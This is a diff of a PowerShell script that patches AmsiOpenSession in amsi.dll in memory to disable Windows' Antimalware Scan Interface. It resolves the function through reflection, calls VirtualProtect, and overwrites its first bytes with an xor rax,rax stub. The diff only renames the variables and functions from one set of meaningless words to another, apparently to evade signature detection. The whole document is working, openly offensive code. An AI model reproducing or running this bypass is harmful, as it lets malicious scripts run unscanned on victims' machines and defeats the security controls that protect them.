@@ -1,13 +1,13 @@
-function ChirtenGland {
-    Param ($BrighamCandy, $ConjureFotui)
+function Bruh {
+    Param ($Bruhh, $wowzers)
 
-    $CarapaxCursed = ([AppDomain]::CurrentDomain.GetAssemblies() |
+    $howmany = ([AppDomain]::CurrentDomain.GetAssemblies() |
     Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll') }).
     GetType('Microsoft.Win32.UnsafeNativeMethods')
-    $AssoilCasqued=@()
-    $CarapaxCursed.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$AssoilCasqued+=$_}}
-    return $AssoilCasqued[0].Invoke($null, @(($CarapaxCursed.GetMethod('GetModuleHandle')).
-    Invoke($null,@($BrighamCandy)), $ConjureFotui))
+    $timesdo=@()
+    $howmany.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$timesdo+=$_}}
+    return $timesdo[0].Invoke($null, @(($howmany.GetMethod('GetModuleHandle')).
+    Invoke($null,@($Bruhh)), $wowzers))
 }
 
 #
@@ -15,37 +15,37 @@ function ChirtenGland {
 #
 #
 #
-function YuporKnit {
+function Ihaveto {
     Param (
-        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $CohogEarhole,
-        [Parameter(Position = 1)] [Type] $ArsinesCanhoop = [Void]
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $Dothis,
+        [Parameter(Position = 1)] [Type] $replacements = [Void]
     )
 
-    $AmmaGuises = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+    $Strategy = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
     [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
     DefineDynamicModule('InMemoryModule', $false).
     DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
     [System.MulticastDelegate])
 
-    $AmmaGuises.DefineConstructor('RTSpecialName, HideBySig, Public',
-    [System.Reflection.CallingConventions]::Standard, $CohogEarhole).
+    $Strategy.DefineConstructor('RTSpecialName, HideBySig, Public',
+    [System.Reflection.CallingConventions]::Standard, $Dothis).
     SetImplementationFlags('Runtime, Managed')
 
-    $AmmaGuises.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ArsinesCanhoop, $CohogEarhole).
+    $Strategy.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $replacements, $Dothis).
     SetImplementationFlags('Runtime, Managed')
 
-    return $AmmaGuises.CreateType()
+    return $Strategy.CreateType()
 
 }
 
-[IntPtr]$ExtentBoffins = ChirtenGland amsi.dll AmsiOpenSession
-$CauchoFormic = 0
-$AiblinsCadmus=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ChirtenGland `
-kernel32.dll VirtualProtect), (YuporKnit @([IntPtr], [Uint32], [Uint32], 
+[IntPtr]$Muffins = Bruh amsi.dll AmsiOpenSession
+$itisvery = 0
+$veryfrustrating=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Bruh `
+kernel32.dll VirtualProtect), (Ihaveto @([IntPtr], [Uint32], [Uint32], 
 [Uint32].MakeByRefType()) ([Bool])))
-$AiblinsCadmus.Invoke($ExtentBoffins, 3, 0x40, [ref]$CauchoFormic)
+$veryfrustrating.Invoke($Muffins, 3, 0x40, [ref]$itisvery)
 
-$AdadGlink = [Byte[]] (0x48, 0x31, 0xC0)
-[System.Runtime.InteropServices.Marshal]::Copy($AdadGlink, 0, $ExtentBoffins, 3)
+$lostproperty = [Byte[]] (0x48, 0x31, 0xC0)
+[System.Runtime.InteropServices.Marshal]::Copy($lostproperty, 0, $Muffins, 3)
 
-$AiblinsCadmus.Invoke($ExtentBoffins, 3, 0x20, [ref]$CauchoFormic)
+$veryfrustrating.Invoke($Muffins, 3, 0x20, [ref]$itisvery)
